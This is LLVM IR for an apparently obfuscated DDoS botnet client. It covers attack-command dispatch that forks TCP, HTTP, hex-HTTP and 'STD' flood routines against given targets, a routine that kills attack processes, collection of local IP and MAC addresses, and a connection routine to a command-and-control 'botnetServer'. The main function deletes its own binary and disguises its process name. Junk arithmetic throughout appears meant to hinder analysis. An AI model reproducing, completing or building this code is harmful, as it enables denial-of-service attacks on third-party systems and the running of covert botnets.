  store i8* %278, i8** %17, align 8
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds i8*, i8** %279, i64 2
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 @atoi(i8* %281) #9
  store i32 %282, i32* %18, align 4
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 3
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @atoi(i8* %285) #9
  store i32 %286, i32* %19, align 4
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 4
  %289 = load i8*, i8** %288, align 8
  %290 = call i32 @atoi(i8* %289) #9
  store i32 %290, i32* %20, align 4
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 5
  %293 = load i8*, i8** %292, align 8
  store i8* %293, i8** %21, align 8
  %294 = load i32, i32* %3, align 4
  %295 = icmp eq i32 %294, 8
  br i1 %295, label %296, label %301

; <label>:296:                                    ; preds = %275
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 7
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @atoi(i8* %299) #9
  br label %302

; <label>:301:                                    ; preds = %275
  br label %302

; <label>:302:                                    ; preds = %301, %296
  %303 = phi i32 [ %300, %296 ], [ 10, %301 ]
  store i32 %303, i32* %22, align 4
  %304 = load i32, i32* %3, align 4
  %305 = icmp sgt i32 %304, 6
  br i1 %305, label %306, label %311

; <label>:306:                                    ; preds = %302
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 6
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #9
  br label %312

; <label>:311:                                    ; preds = %302
  br label %312

; <label>:312:                                    ; preds = %311, %306
  %313 = phi i32 [ %310, %306 ], [ 0, %311 ]
  store i32 %313, i32* %23, align 4
  %314 = load i8*, i8** %17, align 8
  %315 = call i8* @strstr(i8* %314, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #9
  %316 = icmp ne i8* %315, null
  br i1 %316, label %317, label %337

; <label>:317:                                    ; preds = %312
  %318 = load i8*, i8** %17, align 8
  %319 = call i8* @strtok(i8* %318, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %319, i8** %24, align 8
  br label %320

; <label>:320:                                    ; preds = %334, %317
  %321 = load i8*, i8** %24, align 8
  %322 = icmp ne i8* %321, null
  br i1 %322, label %323, label %336

; <label>:323:                                    ; preds = %320
  %324 = call i32 @listFork()
  %325 = icmp ne i32 %324, 0
  br i1 %325, label %334, label %326

; <label>:326:                                    ; preds = %323
  %327 = load i8*, i8** %24, align 8
  %328 = load i32, i32* %18, align 4
  %329 = load i32, i32* %19, align 4
  %330 = load i32, i32* %20, align 4
  %331 = load i8*, i8** %21, align 8
  %332 = load i32, i32* %23, align 4
  %333 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %327, i32 %328, i32 %329, i32 %330, i8* %331, i32 %332, i32 %333)
  call void @_exit(i32 0) #12
  unreachable

; <label>:334:                                    ; preds = %323
  %335 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %335, i8** %24, align 8
  br label %320

; <label>:336:                                    ; preds = %320
  br label %349

; <label>:337:                                    ; preds = %312
  %338 = call i32 @listFork()
  %339 = icmp ne i32 %338, 0
  br i1 %339, label %348, label %340

; <label>:340:                                    ; preds = %337
  %341 = load i8*, i8** %17, align 8
  %342 = load i32, i32* %18, align 4
  %343 = load i32, i32* %19, align 4
  %344 = load i32, i32* %20, align 4
  %345 = load i8*, i8** %21, align 8
  %346 = load i32, i32* %23, align 4
  %347 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %341, i32 %342, i32 %343, i32 %344, i8* %345, i32 %346, i32 %347)
  call void @_exit(i32 0) #12
  unreachable

; <label>:348:                                    ; preds = %337
  br label %349

; <label>:349:                                    ; preds = %348, %336
  br label %350

; <label>:350:                                    ; preds = %349, %223
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 0
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 @strcmp(i8* %353, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.133, i32 0, i32 0)) #9
  %355 = icmp ne i32 %354, 0
  br i1 %355, label %399, label %356

; <label>:356:                                    ; preds = %350
  %357 = load i32, i32* %3, align 4
  %358 = icmp slt i32 %357, 6
  br i1 %358, label %371, label %359

; <label>:359:                                    ; preds = %356
  %360 = load i8**, i8*** %4, align 8
  %361 = getelementptr inbounds i8*, i8** %360, i64 3
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @atoi(i8* %362) #9
  %364 = icmp slt i32 %363, 1
  br i1 %364, label %371, label %365

; <label>:365:                                    ; preds = %359
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 5
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @atoi(i8* %368) #9
  %370 = icmp slt i32 %369, 1
  br i1 %370, label %371, label %372

; <label>:371:                                    ; preds = %365, %359, %356
  br label %553

; <label>:372:                                    ; preds = %365
  %373 = call i32 @listFork()
  %374 = icmp ne i32 %373, 0
  br i1 %374, label %375, label %376

; <label>:375:                                    ; preds = %372
  br label %553

; <label>:376:                                    ; preds = %372
  %377 = load i8**, i8*** %4, align 8
  %378 = getelementptr inbounds i8*, i8** %377, i64 1
  %379 = load i8*, i8** %378, align 8
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 2
  %382 = load i8*, i8** %381, align 8
  %383 = load i8**, i8*** %4, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 3
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @atoi(i8* %385) #9
  %387 = trunc i32 %386 to i16
  %388 = load i8**, i8*** %4, align 8
  %389 = getelementptr inbounds i8*, i8** %388, i64 4
  %390 = load i8*, i8** %389, align 8
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 5
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #9
  %395 = load i8**, i8*** %4, align 8
  %396 = getelementptr inbounds i8*, i8** %395, i64 6
  %397 = load i8*, i8** %396, align 8
  %398 = call i32 @atoi(i8* %397) #9
  call void @SendHTTP(i8* %379, i8* %382, i16 zeroext %387, i8* %390, i32 %394, i32 %398)
  call void @exit(i32 0) #11
  unreachable

; <label>:399:                                    ; preds = %350
  %400 = load i8**, i8*** %4, align 8
  %401 = getelementptr inbounds i8*, i8** %400, i64 0
  %402 = load i8*, i8** %401, align 8
  %403 = call i32 @strcmp(i8* %402, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.134, i32 0, i32 0)) #9
  %404 = icmp ne i32 %403, 0
  br i1 %404, label %448, label %405

; <label>:405:                                    ; preds = %399
  %406 = load i32, i32* %3, align 4
  %407 = icmp slt i32 %406, 6
  br i1 %407, label %420, label %408

; <label>:408:                                    ; preds = %405
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 3
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @atoi(i8* %411) #9
  %413 = icmp slt i32 %412, 1
  br i1 %413, label %420, label %414

; <label>:414:                                    ; preds = %408
  %415 = load i8**, i8*** %4, align 8
  %416 = getelementptr inbounds i8*, i8** %415, i64 5
  %417 = load i8*, i8** %416, align 8
  %418 = call i32 @atoi(i8* %417) #9
  %419 = icmp slt i32 %418, 1
  br i1 %419, label %420, label %421

; <label>:420:                                    ; preds = %414, %408, %405
  br label %553

; <label>:421:                                    ; preds = %414
  %422 = call i32 @listFork()
  %423 = icmp ne i32 %422, 0
  br i1 %423, label %424, label %425

; <label>:424:                                    ; preds = %421
  br label %553

; <label>:425:                                    ; preds = %421
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 1
  %428 = load i8*, i8** %427, align 8
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 2
  %431 = load i8*, i8** %430, align 8
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 3
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  %436 = trunc i32 %435 to i16
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 4
  %439 = load i8*, i8** %438, align 8
  %440 = load i8**, i8*** %4, align 8
  %441 = getelementptr inbounds i8*, i8** %440, i64 5
  %442 = load i8*, i8** %441, align 8
  %443 = call i32 @atoi(i8* %442) #9
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 6
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @atoi(i8* %446) #9
  call void @SendHTTPHex(i8* %428, i8* %431, i16 zeroext %436, i8* %439, i32 %443, i32 %447)
  call void @exit(i32 0) #11
  unreachable

; <label>:448:                                    ; preds = %399
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 0
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @strcmp(i8* %451, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.135, i32 0, i32 0)) #9
  %453 = icmp ne i32 %452, 0
  br i1 %453, label %510, label %454

; <label>:454:                                    ; preds = %448
  %455 = load i32, i32* %3, align 4
  %456 = icmp slt i32 %455, 4
  br i1 %456, label %469, label %457

; <label>:457:                                    ; preds = %454
  %458 = load i8**, i8*** %4, align 8
  %459 = getelementptr inbounds i8*, i8** %458, i64 2
  %460 = load i8*, i8** %459, align 8
  %461 = call i32 @atoi(i8* %460) #9
  %462 = icmp slt i32 %461, 1
  br i1 %462, label %469, label %463

; <label>:463:                                    ; preds = %457
  %464 = load i8**, i8*** %4, align 8
  %465 = getelementptr inbounds i8*, i8** %464, i64 3
  %466 = load i8*, i8** %465, align 8
  %467 = call i32 @atoi(i8* %466) #9
  %468 = icmp slt i32 %467, 1
  br i1 %468, label %469, label %470

; <label>:469:                                    ; preds = %463, %457, %454
  br label %553

; <label>:470:                                    ; preds = %463
  %471 = load i8**, i8*** %4, align 8
  %472 = getelementptr inbounds i8*, i8** %471, i64 1
  %473 = load i8*, i8** %472, align 8
  store i8* %473, i8** %25, align 8
  %474 = load i8**, i8*** %4, align 8
  %475 = getelementptr inbounds i8*, i8** %474, i64 2
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 @atoi(i8* %476) #9
  store i32 %477, i32* %26, align 4
  %478 = load i8**, i8*** %4, align 8
  %479 = getelementptr inbounds i8*, i8** %478, i64 3
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @atoi(i8* %480) #9
  store i32 %481, i32* %27, align 4
  %482 = load i8*, i8** %25, align 8
  %483 = call i8* @strstr(i8* %482, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #9
  %484 = icmp ne i8* %483, null
  br i1 %484, label %485, label %501

; <label>:485:                                    ; preds = %470
  %486 = load i8*, i8** %25, align 8
  %487 = call i8* @strtok(i8* %486, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %487, i8** %28, align 8
  br label %488

; <label>:488:                                    ; preds = %498, %485
  %489 = load i8*, i8** %28, align 8
  %490 = icmp ne i8* %489, null
  br i1 %490, label %491, label %500

; <label>:491:                                    ; preds = %488
  %492 = call i32 @listFork()
  %493 = icmp ne i32 %492, 0
  br i1 %493, label %498, label %494

; <label>:494:                                    ; preds = %491
  %495 = load i8*, i8** %28, align 8
  %496 = load i32, i32* %26, align 4
  %497 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %495, i32 %496, i32 %497)
  call void @_exit(i32 0) #12
  unreachable

; <label>:498:                                    ; preds = %491
  %499 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %499, i8** %28, align 8
  br label %488

; <label>:500:                                    ; preds = %488
  br label %509

; <label>:501:                                    ; preds = %470
  %502 = call i32 @listFork()
  %503 = icmp ne i32 %502, 0
  br i1 %503, label %504, label %505

; <label>:504:                                    ; preds = %501
  br label %553

; <label>:505:                                    ; preds = %501
  %506 = load i8*, i8** %25, align 8
  %507 = load i32, i32* %26, align 4
  %508 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %506, i32 %507, i32 %508)
  call void @_exit(i32 0) #12
  unreachable

; <label>:509:                                    ; preds = %500
  br label %510

; <label>:510:                                    ; preds = %509, %448
  %511 = load i8**, i8*** %4, align 8
  %512 = getelementptr inbounds i8*, i8** %511, i64 0
  %513 = load i8*, i8** %512, align 8
  %514 = call i32 @strcmp(i8* %513, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.136, i32 0, i32 0)) #9
  %515 = icmp ne i32 %514, 0
  br i1 %515, label %553, label %516

; <label>:516:                                    ; preds = %510
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %517

; <label>:517:                                    ; preds = %546, %516
  %518 = load i64, i64* %30, align 8
  %519 = load i64, i64* @numpids, align 8
  %520 = icmp ult i64 %518, %519
  br i1 %520, label %521, label %552

; <label>:521:                                    ; preds = %517
  %522 = load i32*, i32** @pids, align 8
  %523 = load i64, i64* %30, align 8
  %524 = getelementptr inbounds i32, i32* %522, i64 %523
  %525 = load i32, i32* %524, align 4
  %526 = icmp ne i32 %525, 0
  br i1 %526, label %527, label %545

; <label>:527:                                    ; preds = %521
  %528 = load i32*, i32** @pids, align 8
  %529 = load i64, i64* %30, align 8
  %530 = getelementptr inbounds i32, i32* %528, i64 %529
  %531 = load i32, i32* %530, align 4
  %532 = call i32 @getpid() #3
  %533 = icmp ne i32 %531, %532
  br i1 %533, label %534, label %545

; <label>:534:                                    ; preds = %527
  %535 = load i32*, i32** @pids, align 8
  %536 = load i64, i64* %30, align 8
  %537 = getelementptr inbounds i32, i32* %535, i64 %536
  %538 = load i32, i32* %537, align 4
  %539 = call i32 @kill(i32 %538, i32 9) #3
  %540 = load i32, i32* %29, align 4
  %541 = sub i32 %540, 778612132
  %542 = add i32 %541, 1
  %543 = add i32 %542, 778612132
  %544 = add nsw i32 %540, 1
  store i32 %543, i32* %29, align 4
  br label %545

; <label>:545:                                    ; preds = %534, %527, %521
  br label %546

; <label>:546:                                    ; preds = %545
  %547 = load i64, i64* %30, align 8
  %548 = add i64 %547, -208783015961241880
  %549 = add i64 %548, 1
  %550 = sub i64 %549, -208783015961241880
  %551 = add i64 %547, 1
  store i64 %550, i64* %30, align 8
  br label %517

; <label>:552:                                    ; preds = %517
  br label %553

; <label>:553:                                    ; preds = %552, %510, %504, %469, %424, %420, %375, %371, %274, %222, %134, %68, %63, %58, %45
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0)) #3
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #10
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #3
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.138, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.139, i32 0, i32 0)) #9
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.4* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #3
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #3
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.5* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.140 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.141 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.142 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.143 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.144 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @KadenCommStock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @KadenCommStock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @KadenCommStock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @botnetServer, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = icmp eq i64 %17, 1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %10
  store i32 0, i32* @botnetServer, align 4
  br label %27

; <label>:20:                                     ; preds = %10
  %21 = load i32, i32* @botnetServer, align 4
  %22 = sub i32 0, %21
  %23 = sub i32 0, 1
  %24 = add i32 %22, %23
  %25 = sub i32 0, %24
  %26 = add nsw i32 %21, 1
  store i32 %25, i32* @botnetServer, align 4
  br label %27

; <label>:27:                                     ; preds = %20, %19
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = load i32, i32* @botnetServer, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1 x i8*], [1 x i8*]* @ServerInfo, i64 0, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strcpy(i8* %28, i8* %32) #3
  store i32 282, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  %36 = icmp ne i8* %35, null
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %27
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %39 = call i8* @strchr(i8* %38, i32 58) #9
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = call i32 @atoi(i8* %40) #9
  store i32 %41, i32* %3, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #9
  store i8 0, i8* %43, align 1
  br label %44

; <label>:44:                                     ; preds = %37, %27
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %45, i32* @KadenCommStock, align 4
  %46 = load i32, i32* @KadenCommStock, align 4
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %48 = load i32, i32* %3, align 4
  %49 = call i32 @connectTimeout(i32 %46, i8* %47, i32 %48, i32 30)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %44
  store i32 1, i32* %1, align 4
  br label %53

; <label>:52:                                     ; preds = %44
  store i32 0, i32* %1, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %51
  %54 = load i32, i32* %1, align 4
  ret i32 %54
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca [32 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @unlink(i8* %27) #3
  call void @rand_init()
  %29 = call i32 @rand_next()
  %30 = urem i32 %29, 4
  %31 = add i32 %30, -262821787
  %32 = add i32 %31, 3
  %33 = sub i32 %32, -262821787
  %34 = add i32 %30, 3
  %35 = mul i32 %33, 4
  store i32 %35, i32* %8, align 4
  %36 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %37 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %36, i32 %37)
  %38 = load i32, i32* %8, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %39
  store i8 0, i8* %40, align 1
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %45 = call i32 @util_strcpy(i8* %43, i8* %44)
  %46 = call i32 @rand_next()
  %47 = urem i32 %46, 6
  %48 = sub i32 %47, -1132296190
  %49 = add i32 %48, 3
  %50 = add i32 %49, -1132296190
  %51 = add i32 %47, 3
  %52 = mul i32 %50, 4
